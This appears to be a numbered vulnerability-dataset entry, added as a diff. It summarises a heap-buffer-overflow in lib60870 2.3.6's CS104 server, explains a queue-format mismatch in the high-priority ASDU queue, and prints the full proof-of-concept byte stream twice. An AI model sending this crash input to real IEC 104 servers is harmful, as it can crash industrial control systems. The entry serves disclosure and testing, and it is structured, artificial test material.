@@ -1,0 +1,15 @@
+Number: 196
+
+Summarize:
+lib60870 2.3.6 CS104 server-side code reportedly has a heap-buffer-overflow when it processes the supplied PoC byte stream. The crash is in HighPriorityASDUQueue_hasUnconfirmedIMessages(), on the path handleMessage() -> MasterConnection_hasUnconfirmedMessages() -> HighPriorityASDUQueue_hasUnconfirmedIMessages(). The reporter's debugging suggests a format mismatch in the high-priority ASDU queue: HighPriorityASDUQueue_enqueue() stores a uint16_t msgSize followed by encoded ASDU bytes, while HighPriorityASDUQueue_hasUnconfirmedIMessages() later traverses the queue as if entries begin with struct sMessageQueueEntryInfo. In that analysis, ASDU payload bytes are misinterpreted as queue metadata, a bogus entryInfo.size moves traversal past lastEntry, and reading continues into non-entry data until an out-of-bounds read occurs. The observed result is an AddressSanitizer heap-buffer-overflow.
+
+Reproduce:
+No build configuration, example program, or commands are provided.
+1. Use a target exercising the lib60870 2.3.6 CS104 server-side code.
+2. Supply the PoC byte stream:
+<68><04><07><30><30><30><68><23><00><00><00><00><64><30><06><30><30><00><00><00><00><14><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><1a><68><21><02><00><00><00><64><30><06><30><30><00><00><00><00><14><30><04><30><30><30><30><30><30><30><30><30><30><30><30><68><30><30><68><30><68><68><04><00><00><00><64><30><06><30><30><30><00><00><00><14><30><04><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><00><30><30><30><30><30><02><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><68><04><1b><30><30><30>
+3. The document says this reaches handleMessage() -> MasterConnection_hasUnconfirmedMessages() -> HighPriorityASDUQueue_hasUnconfirmedIMessages(). The reported diagnostic is:
+==111155==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x51e000001694 at pc 0x56e64860c987 bp 0x74d1424f4c20 sp 0x74d1424f4c18
+
+Payload:
+68 04 07 30 30 30 68 23 00 00 00 00 64 30 06 30 30 00 00 00 00 14 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 1a 68 21 02 00 00 00 64 30 06 30 30 00 00 00 00 14 30 04 30 30 30 30 30 30 30 30 30 30 30 30 68 30 30 68 30 68 68 04 00 00 00 64 30 06 30 30 30 00 00 00 14 30 04 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 00 30 30 30 30 30 02 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 68 04 1b 30 30 30
